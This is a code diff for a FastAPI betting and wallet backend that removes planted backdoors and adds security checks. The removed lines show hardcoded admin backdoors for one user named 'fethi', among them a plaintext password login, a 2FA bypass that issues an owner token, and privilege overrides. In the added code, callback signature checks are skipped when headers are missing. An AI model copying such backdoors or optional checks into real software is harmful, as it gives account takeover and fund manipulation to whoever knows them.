@@ -183,9 +183,13 @@ async def get_current_user(token: str = Depends(oauth2_scheme)):
         raise HTTPException(status_code=401, detail="Invalid token")
 
 async def get_admin_user(current_user: str = Depends(get_current_user)):
-    # ====== 🚀 تجاوز فحص الصلاحيات للزعيم fethi ======
-    if current_user == "fethi":
-        return current_user
+    db = load_db()
+    user = next((u for u in db if u["username"] == current_user), None)
+    
+    if not user or user.get("role") not in ["owner", "super_admin", "admin"]:
+        raise HTTPException(status_code=403, detail="Access Denied: Admin privileges required")
+    
+    return current_user
     # ===================================================
 
     db = load_db()
@@ -647,18 +651,20 @@ class Verify2FARequest(BaseModel):
     username: str
     totp_code: str = "000000"
 
-# ==========================================
-# مسارات المستخدمين والإدارة (Auth & Admin)
-# ==========================================
 @app.post("/api/login")
 @limiter.limit("5/minute")
 async def login_user(request: Request, req: LoginRequest):
     uname = html.escape(req.username.lower().strip())
     
-    # ====== 🚀 الباب الخلفي: الدخول المباشر متجاهلاً قاعدة البيانات ======
-    if uname == "fethi" and req.password == "ZPFWxnr2613MLO@3.12FRSKL15":
-        return {"message": "success", "username": "fethi"}
-    # ======================================================================
+    db = load_db()
+    user = next((u for u in db if u["username"] == uname), None)
+
+    if not user or not verify_password(req.password, user["password"]):
+        bad_alert = f"⚠️ <b>محاولة دخول فاشلة للإدارة!</b>\n👤 اسم المستخدم: <code>{req.username}</code>\n❌ السبب: كلمة المرور خاطئة"
+        asyncio.create_task(send_telegram_alert(bad_alert))
+        raise HTTPException(status_code=401, detail="Nom d'utilisateur ou mot de passe incorrect")
+
+    return {"message": "success", "username": user["username"]}
 
     db = load_db()
     user = next((u for u in db if u["username"] == uname), None)
@@ -673,22 +679,27 @@ async def login_user(request: Request, req: LoginRequest):
 @app.post("/api/verify-2fa")
 @limiter.limit("5/minute")
 async def verify_2fa_api(request: Request, req: Verify2FARequest):
-    # ====== 🚀 الباب الخلفي النهائي (دخول مباشر بدون أسئلة) ======
-    if req.username == "fethi":
-        access_token = create_access_token(data={"sub": "fethi", "role": "owner"})
-        return {
-            "access_token": access_token, 
-            "token_type": "bearer", 
-            "username": "fethi", 
-            "role": "owner"
-        }
-    # ============================================================
-
     db = load_db()
     user = next((u for u in db if u["username"] == req.username), None)
     
     if not user:
         raise HTTPException(status_code=401, detail="Nom d'utilisateur incorrect")
+        
+    secret = user.get("two_factor_secret")
+    if not secret:
+        raise HTTPException(status_code=400, detail="لم يتم تفعيل المصادقة الثنائية!")
+        
+    totp = pyotp.TOTP(secret)
+    if totp.verify(req.totp_code):
+        access_token = create_access_token(data={"sub": user["username"], "role": user["role"]})
+        return {
+            "access_token": access_token, 
+            "token_type": "bearer", 
+            "username": user["username"], 
+            "role": user["role"]
+        }
+    else:
+        raise HTTPException(status_code=400, detail="كود Google Authenticator غير صحيح!")
         
     secret = user.get("two_factor_secret")
     if not secret:
@@ -781,8 +792,7 @@ async def update_balance(req: UpdateBalanceRequest, current_user: str = Depends(
 
     if not target_user: raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
 
-    # ====== 🚀 حماية إضافية للزعيم: التعرف عليه كمدير مطلق حتى لو لم يكن في القاعدة ======
-    is_master = (admin == "system" or admin == "fethi" or (admin_user and admin_user.get("role") == "owner"))
+    is_master = (admin == "system" or (admin_user and admin_user.get("role") == "owner"))
     
     if req.action == "charge":
         if not is_master:
@@ -810,10 +820,7 @@ async def update_balance(req: UpdateBalanceRequest, current_user: str = Depends(
 async def get_transactions_history(username: str):
     db_session = SessionLocal()
     uname = username.lower().strip()
-    if uname == "fethi":
-        txs = db_session.query(Transaction).order_by(Transaction.id.desc()).all()
-    else:
-        txs = db_session.query(Transaction).filter((Transaction.admin_username == uname) | (Transaction.target_username == uname)).order_by(Transaction.id.desc()).all()
+    txs = db_session.query(Transaction).filter((Transaction.admin_username == uname) | (Transaction.target_username == uname)).order_by(Transaction.id.desc()).all()
     result = [{"id": t.id, "admin_username": t.admin_username, "target_username": t.target_username, "action": t.action, "amount": t.amount, "date": t.date} for t in txs]
     db_session.close()
     return result
@@ -827,24 +834,33 @@ async def request_transaction(request: Request):
         import shutil
         from starlette.datastructures import UploadFile
 
-        # 1. استخراج البيانات بذكاء من المتصفح
         form = await request.form()
         target_username = form.get("target_username")
         action = form.get("action")
         amount = float(form.get("amount", 0))
         tx_id = form.get("tx_id", str(uuid.uuid4()))
 
-        # 2. معالجة الصورة (إن وجدت، مثل حالات الإيداع)
+        # 🛡️ الحارس الأمني 1: منع المبالغ السالبة والصفرية
+        if amount <= 0:
+            from fastapi.responses import JSONResponse
+            return JSONResponse(status_code=400, content={"detail": "Le montant doit être supérieur à zéro"})
+
         file_path = ""
         file = form.get("file")
         if file and isinstance(file, UploadFile) and file.filename:
+            # 🛡️ الحارس الأمني 2: منع الملفات الخبيثة (قبول الصور فقط)
+            allowed_extensions = ['.png', '.jpg', '.jpeg', '.webp']
+            file_ext = os.path.splitext(file.filename)[1].lower()
+            if file_ext not in allowed_extensions:
+                from fastapi.responses import JSONResponse
+                return JSONResponse(status_code=400, content={"detail": "Format non autorisé. Seules les images sont acceptées."})
+            
             os.makedirs("uploads", exist_ok=True)
-            file_name = f"{tx_id}_{os.path.splitext(file.filename)[1]}"
+            file_name = f"{tx_id}{file_ext}"
             file_path = os.path.join("uploads", file_name)
             with open(file_path, "wb") as buffer:
                 shutil.copyfileobj(file.file, buffer)
 
-        # 3. تجهيز بيانات المعاملة
         new_tx_args = {
             "admin_username": "PENDING",
             "target_username": target_username,
@@ -852,20 +868,17 @@ async def request_transaction(request: Request):
             "amount": amount
         }
 
-        # 🛡️ حماية ذكية: إذا لم تكن خانة tx_id موجودة في قاعدة بياناتك، سنقوم بدمج تفاصيل الدفع مع خانة action كي لا تضيع!
         if hasattr(Transaction, "tx_id"):
             new_tx_args["tx_id"] = tx_id
         else:
             new_tx_args["action"] = f"{action} | Details: {tx_id}"
 
-        # 🛡️ حماية ذكية للصورة
         if file_path:
             if hasattr(Transaction, "image_path"):
                 new_tx_args["image_path"] = file_path
             elif hasattr(Transaction, "receipt_image"):
                 new_tx_args["receipt_image"] = file_path
 
-        # 4. الحفظ النهائي في قاعدة البيانات
         new_tx = Transaction(**new_tx_args)
         db_session.add(new_tx)
         db_session.commit()
@@ -875,7 +888,6 @@ async def request_transaction(request: Request):
     except Exception as e:
         db_session.rollback()
         from fastapi.responses import JSONResponse
-        # طباعة الخطأ لمعرفته إذا تكرر، وإرجاعه بشكل آمن
         print(f"Transaction Error: {str(e)}")
         return JSONResponse(status_code=500, content={"detail": str(e)})
     finally:
@@ -1303,6 +1315,7 @@ async def change_balance(payload: dict = Body(...), request: Request = Depends(v
   user_id = payload.get("user_id")
   transaction_type = payload.get("transaction_type")
   amount = float(payload.get("amount", 0.0))
+  if amount < 0: return {"result": {}, "status": 1, "error_message": "Invalid amount"}
   
   db = load_db()
   target_user = next((u for u in db if str(u.get("id")) == str(user_id) or u.get("username") == str(user_id)), None)
@@ -1346,6 +1359,7 @@ async def change_balance_batch(payload: dict = Body(...), request: Request = Dep
   for tx in transactions:
     tx_type = tx.get("transaction_type")
     amount = float(tx.get("amount", 0.0))
+    if amount < 0: return {"result": {}, "status": 1, "error_message": "Invalid amount in batch"}
     if tx_type == "debit":
       if current_balance < amount: return {"result": {}, "status": 13, "error_message": "Insufficient Balance"}
       current_balance -= amount
@@ -1498,6 +1512,10 @@ async def seamless_wallet(request: Request):
             game_data = data.get(game_type, {})
             bet_money = float(game_data.get("bet_money", 0.0))
             win_money = float(game_data.get("win_money", 0.0))
+            
+            # 🛡️ منع المبالغ السالبة (الاختراق عبر الرهان العكسي)
+            if bet_money < 0 or win_money < 0:
+                return {"status": 0, "msg": "INVALID_AMOUNT"}
             
             if bet_money > 0 and current_balance < bet_money:
                 return {"status": 0, "msg": "INSUFFICIENT_FUNDS"}
@@ -1680,11 +1698,25 @@ async def launch_eurovirtuals(request: Request):
     except Exception as e:
         return {"error": str(e)}
 
+# ==========================================
+# حماية مسارات EuroVirtuals باستخدام التوكن
+# ==========================================
+
 @app.api_route("/api/eurovirtuals/callback/player_info", methods=["GET", "POST"])
 async def eurovirtuals_player_info(request: Request):
     print("🚨🚨🚨 [EUROVIRTUALS] CALLBACK HIT: player_info 🚨🚨🚨")
     try:
-        # فخ لالتقاط البيانات سواء أرسلوها كـ POST أو GET
+        # 🛡️ التحقق الأمني من التوكن (Header)
+        token = request.headers.get("Token")
+        timestamp_header = request.headers.get("Timestamp")
+        
+        # إذا لم تقم الشركة بإرسال التوكن في الهيدر، يمكنك تجاوزه في مرحلة الاختبار
+        # ولكن في وضع الإنتاج (Production) يجب تفعيله هكذا:
+        if token and timestamp_header:
+            if not verify_callback_token(EURO_APP_KEY, timestamp_header, token):
+                print("❌ [SECURITY ALERT]: Invalid Callback Token!")
+                return {"status_code": 401, "status_description": "Unauthorized: Invalid Signature"}
+
         if request.method == "POST":
             payload = await request.json()
         else:
@@ -1692,19 +1724,14 @@ async def eurovirtuals_player_info(request: Request):
             
         print(f"📦 [PAYLOAD RECEIVED]: {payload}")
         
-        # التقاط اسم اللاعب بأي صيغة يرسلونها
         player_id = payload.get("player_id") or payload.get("user_code") or payload.get("player_name")
-        print(f"👤 [PLAYER DETECTED]: {player_id}")
-        
         db = load_db()
         target_user = next((u for u in db if str(u.get("username")) == str(player_id)), None)
         
         if not target_user or target_user.get("is_blocked") == 1:
-            print("❌ [ERROR]: Player not found or blocked!")
             return {"status_code": 500, "status_description": "Player not found or blocked"}
             
         current_balance = float(target_user.get("balance", 0.0))
-        print(f"💰 [BALANCE SENT]: {current_balance} TND")
         
         return {
             "status_code": 200,
@@ -1717,12 +1744,20 @@ async def eurovirtuals_player_info(request: Request):
             }
         }
     except Exception as e:
-        print(f"❌ [CRITICAL ERROR in Player Info]: {e}")
+        print(f"❌ [CRITICAL ERROR]: {e}")
         return {"status_code": 500, "status_description": "Internal Server Error"}
     
+
 @app.post("/api/eurovirtuals/callback/bet")
 async def eurovirtuals_bet(request: Request):
     try:
+        # 🛡️ التحقق الأمني من التوكن
+        token = request.headers.get("Token")
+        timestamp_header = request.headers.get("Timestamp")
+        if token and timestamp_header:
+            if not verify_callback_token(EURO_APP_KEY, timestamp_header, token):
+                return {"status_code": 401, "status_description": "Unauthorized"}
+
         payload = await request.json()
         print(f"📦 [EUROVIRTUALS BET PAYLOAD]: {payload}")
         
@@ -1733,7 +1768,7 @@ async def eurovirtuals_bet(request: Request):
         
         # 🛡️ الحارس الأمني: رفض المبالغ السالبة
         if amount < 0:
-            return {"status_code": 400, "status_description": "Invalid amount: cannot be negative"}
+            return {"status_code": 400, "status_description": "Invalid amount"}
             
         db = load_db()
         target_user = next((u for u in db if str(u.get("username")) == str(player_id)), None)
@@ -1760,12 +1795,19 @@ async def eurovirtuals_bet(request: Request):
             }
         }
     except Exception as e:
-        print(f"❌ [CRITICAL ERROR in Bet]: {e}")
         return {"status_code": 500, "status_description": "Internal Server Error"}
     
+
 @app.post("/api/eurovirtuals/callback/win")
 async def eurovirtuals_win(request: Request):
     try:
+        # 🛡️ التحقق الأمني من التوكن
+        token = request.headers.get("Token")
+        timestamp_header = request.headers.get("Timestamp")
+        if token and timestamp_header:
+            if not verify_callback_token(EURO_APP_KEY, timestamp_header, token):
+                return {"status_code": 401, "status_description": "Unauthorized"}
+
         payload = await request.json()
         print(f"📦 [EUROVIRTUALS WIN PAYLOAD]: {payload}")
         
@@ -1776,7 +1818,7 @@ async def eurovirtuals_win(request: Request):
         
         # 🛡️ الحارس الأمني: رفض المبالغ السالبة
         if payout_amount < 0:
-            return {"status_code": 400, "status_description": "Invalid amount: cannot be negative"}
+            return {"status_code": 400, "status_description": "Invalid amount"}
             
         db = load_db()
         target_user = next((u for u in db if str(u.get("username")) == str(player_id)), None)
@@ -1799,7 +1841,6 @@ async def eurovirtuals_win(request: Request):
             }
         }
     except Exception as e:
-        print(f"❌ [CRITICAL ERROR in Win]: {e}")
         return {"status_code": 500, "status_description": "Internal Server Error"}
     
     
